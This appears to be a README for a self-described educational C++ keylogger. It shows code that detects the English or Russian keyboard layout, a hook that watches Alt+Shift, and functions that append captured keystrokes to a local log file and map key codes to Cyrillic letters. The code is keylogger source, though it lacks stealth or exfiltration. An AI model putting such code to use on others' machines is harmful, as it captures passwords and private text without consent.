# This is a regular keylogger created for educational purposes in c++.

My keylogger tracks the key code thanks to the `GetAsyncKeyState()` function,  but to determine the keyboard layout I created a `layout()` function:
```C++
void layout() {
    HKL layout = GetKeyboardLayout(0);
    DWORD layoutId = LOWORD(layout);

    if (layoutId == 0x0409) {
        laught = true;//use
    }
    else {
        laught = false;//ru
    }
}
```
This function detects laught only after running the code, so I created an `Alt + Shift` tracking hook to assign a value to the variable `laught`
```c++
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION)
    {
        if ((GetAsyncKeyState(VK_MENU) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000))
        {

            if (laught) {
                laught = false;//ru
            }
            else {
                laught = true;//en
            }

        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}
```

For the hook I needed to use the `<thread>` library to simultaneously capture the `Alt + Shift` key combination and also to check the key code.

**After determining the layout, the keylogger translates the key code into Cyrillic using `translateLetter()` or immediately writes the characters to the file `"THIS_IS_KEYLOGGER.txt"`.**
```c++
void saveData(char data) {
    ofstream log;
    log.open("THIS_IS_KEYLOGGER.txt", ofstream::app);

    if (log.is_open()) log << data;

    log.close();
    cout << data;
}

char translateLetter(char letter) {
    switch (letter)
    {
    case 13: return '\n';
    case 32: return ' ';

    case 65: return 'Ф';
    case 66: return 'И';
    case 67: return 'С';
    case 68: return 'В';
    case 69: return 'У';
    case 70: return 'А';
    case 71: return 'П';
    case 72: return 'Р';
    case 73: return 'Ш';
    case 74: return 'О';
    case 75: return 'Л';
    case 76: return 'Д';
    case 77: return 'Ь';
    case 78: return 'Т';
    case 79: return 'Щ';
    case 80: return 'З';
    case 81: return 'Й';
    case 82: return 'К';
    case 83: return 'Ы';
    case 84: return 'Е';
    case 85: return 'Г';
    case 86: return 'М';
    case 87: return 'Ц';
    case 88: return 'Ч';
    case 89: return 'Н';
    case 90: return 'Я';

    default: return ' ';
        break;
    }
}
```
